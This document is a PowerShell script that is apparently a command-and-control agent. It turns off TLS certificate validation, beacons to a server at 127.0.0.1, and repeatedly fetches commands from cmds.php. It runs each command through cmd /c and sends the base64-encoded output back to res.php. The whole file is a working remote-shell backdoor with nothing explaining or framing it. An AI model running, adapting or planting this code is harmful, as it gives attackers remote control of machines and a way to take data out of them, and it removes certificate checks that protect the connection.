add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$id=$Args[0]
$a = "Hello From Agent"
$b = "(Windows)"
$Hello = "$($a) $($id) $($b)"
$EncHelloBytes = [System.Text.Encoding]::UTF8.GetBytes($Hello)
$EncHello = [System.Convert]::ToBase64String($EncHelloBytes)

$hello=(Invoke-WebRequest "https://127.0.0.1/res.php?res=$EncHello&id=$id")

while($true)
{


$Content=(Invoke-WebRequest "https://127.0.0.1/cmds.php?id=789&o=W").Content

if ([string]::IsNullOrWhiteSpace($Content))
    {
		Start-Sleep -Seconds 10
        continue
    }

$Content= $Content.Split(
    @("`r`n", "`r", "`n"), 
   [StringSplitOptions]::None)


if ([string]::IsNullOrWhiteSpace($Content))
    {
		Start-Sleep -Seconds 10
        continue
    }


ForEach ($line in $Content)
{
	$cmd = Select-String -pattern "$id" -InputObject $line
	$cmd = ($cmd -split ':',2)[-1]
	if ([string]::IsNullOrWhiteSpace($cmd))
    {
        continue
    }

	$Output = cmd /c $cmd '2>&1'
	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
    $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
	
$gimme=(Invoke-WebRequest "https://127.0.0.1/res.php?res=$EncOutput&id=$id")
}   



}
